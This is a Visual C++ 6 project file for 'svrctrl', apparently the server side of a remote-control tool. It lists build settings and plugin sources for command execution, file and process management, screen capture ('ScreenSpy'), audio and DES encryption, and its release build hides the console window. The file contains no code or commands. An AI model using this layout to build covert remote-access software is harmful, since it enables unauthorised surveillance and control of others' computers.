# Microsoft Developer Studio Project File - Name="svrctrl" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Console Application" 0x0103

CFG=svrctrl - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "svrctrl.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "svrctrl.mak" CFG="svrctrl - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "svrctrl - Win32 Debug" (based on "Win32 (x86) Console Application")
!MESSAGE "svrctrl - Win32 Release" (based on "Win32 (x86) Console Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
RSC=rc.exe

!IF  "$(CFG)" == "svrctrl - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "..\..\build\debug\svrexe"
# PROP BASE Intermediate_Dir "..\..\build\debug\svrexe"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "..\..\build\debug\svrexe"
# PROP Intermediate_Dir "..\..\build\debug\svrexe"
# PROP Target_Dir ""
MTL=midl.exe
# ADD BASE MTL /nologo /win32
# ADD MTL /nologo /win32
# ADD BASE CPP /nologo /MDd /W3 /Gm /GX /ZI /Od /I "../../common" /D "WIN32" /D "_DEBUG" /D "_CONSOLE" /D "SVRCTRL_EXPORTS" /D "_UNICODE" /GZ PRECOMP_VC7_TOBEREMOVED /c
# ADD CPP /nologo /MDd /W3 /Gm /GX /ZI /Od /I "../../common" /D "WIN32" /D "_DEBUG" /D "_CONSOLE" /D "SVRCTRL_EXPORTS" /D "_UNICODE" /GZ PRECOMP_VC7_TOBEREMOVED /c
# ADD BASE RSC /l 0x409
# ADD RSC /l 0x409
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib libconnD.lib ws2_32.lib Netapi32.lib Rpcrt4.lib Iphlpapi.lib /nologo /subsystem:console /debug /machine:IX86 /out:"..\..\bin\debug\svrdll\$(ProjectName).exe" /pdbtype:sept /libpath:"../../libs"
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib libconnD.lib ws2_32.lib Netapi32.lib Rpcrt4.lib Iphlpapi.lib /nologo /subsystem:console /debug /machine:IX86 /out:"..\..\bin\debug\svrdll\$(ProjectName).exe" /pdbtype:sept /libpath:"../../libs"

!ELSEIF  "$(CFG)" == "svrctrl - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "..\..\build\release\svrexe"
# PROP BASE Intermediate_Dir "..\..\build\release\svrexe"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "..\..\build\release\svrexe"
# PROP Intermediate_Dir "..\..\build\release\svrexe"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
MTL=midl.exe
# ADD BASE MTL /nologo /win32
# ADD MTL /nologo /win32
# ADD BASE CPP /nologo /MT /W3 /GX /Os /Ob2 /Gy /I "../../common" /I "../allPlugins" /D "TRIVAL" /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "SVRCTRL_EXPORTS" /D "_MBCS" PRECOMP_VC7_TOBEREMOVED /c
# ADD CPP /nologo /MT /W3 /GX /Os /Ob2 /Gy /I "../../common" /I "../allPlugins" /D "TRIVAL" /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "SVRCTRL_EXPORTS" /D "_MBCS" PRECOMP_VC7_TOBEREMOVED /c
# ADD BASE RSC /l 0x409
# ADD RSC /l 0x409
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib winmm.lib kernel32.lib user32.lib gdi32.lib zlib.lib Netapi32.lib Rpcrt4.lib Iphlpapi.lib libconn2.lib LIBCMT.lib /nologo /entry:"mainCRTStartup" /subsystem:windows /machine:IX86 /nodefaultlib:"msvcrt.lib" /out:"..\..\bin\svrdll\$(ProjectName).exe" /pdbtype:sept /libpath:"../../libs" /opt:ref /opt:icf
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib winmm.lib kernel32.lib user32.lib gdi32.lib zlib.lib Netapi32.lib Rpcrt4.lib Iphlpapi.lib libconn2.lib LIBCMT.lib /nologo /entry:"mainCRTStartup" /subsystem:windows /machine:IX86 /nodefaultlib:"msvcrt.lib" /out:"..\..\bin\svrdll\svrctrl.exe" /pdbtype:sept /libpath:"../../libs" /opt:ref /opt:icf

!ENDIF 

# Begin Target

# Name "svrctrl - Win32 Debug"
# Name "svrctrl - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx"
# Begin Source File

SOURCE=.\svrctrl.cpp
DEP_CPP_SVRCT=\
	"..\..\common\conn.h"\
	"..\..\common\macro.h"\
	"..\..\common\svrcmdtab.h"\
	"..\..\common\svrdll.h"\
	"..\..\common\zconf.h"\
	"..\..\common\zlib.h"\
	"..\allPlugins\audioMgr.h"\
	"..\allPlugins\execCmd.h"\
	"..\allPlugins\fileOperation.h"\
	"..\allPlugins\processMgr.h"\
	"..\allPlugins\queryInfo.h"\
	"..\allPlugins\screen.h"\
	"..\allPlugins\svrctrl.h"\
	".\svrctrl.h"\
	".\WjcDes.h"\
	
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl;inc;xsd"
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav"
# End Group
# Begin Group "allPlugins"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\allPlugins\audio.cpp
DEP_CPP_AUDIO=\
	"..\allPlugins\audio.h"\
	
# End Source File
# Begin Source File

SOURCE=..\allPlugins\audio.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\audioMgr.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\audioMgr.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\execCmd.cpp
DEP_CPP_EXECC=\
	"..\..\common\conn.h"\
	"..\..\common\macro.h"\
	"..\..\common\svrdll.h"\
	"..\allPlugins\execCmd.h"\
	
# End Source File
# Begin Source File

SOURCE=..\allPlugins\execCmd.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\fileOperation.cpp
DEP_CPP_FILEO=\
	"..\..\common\conn.h"\
	"..\..\common\macro.h"\
	"..\..\common\svrdll.h"\
	"..\allPlugins\fileOperation.h"\
	
# End Source File
# Begin Source File

SOURCE=..\allPlugins\fileOperation.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\network.cpp
DEP_CPP_NETWO=\
	"..\..\common\macro.h"\
	"..\allPlugins\svrctrl.h"\
	
# End Source File
# Begin Source File

SOURCE=..\allPlugins\processMgr.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\processMgr.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\queryInfo.cpp
DEP_CPP_QUERY=\
	"..\..\common\conn.h"\
	"..\..\common\macro.h"\
	"..\..\common\svrdll.h"\
	"..\allPlugins\queryInfo.h"\
	
# End Source File
# Begin Source File

SOURCE=..\allPlugins\queryInfo.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\screen.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\screen.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\ScreenSpy.cpp
DEP_CPP_SCREE=\
	"..\allPlugins\ScreenSpy.h"\
	
# End Source File
# Begin Source File

SOURCE=..\allPlugins\ScreenSpy.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\svrctrl.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\WjcDes.cpp
DEP_CPP_WJCDE=\
	"..\allPlugins\WjcDes.h"\
	
# End Source File
# Begin Source File

SOURCE=..\allPlugins\WjcDes.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# End Target
# End Project
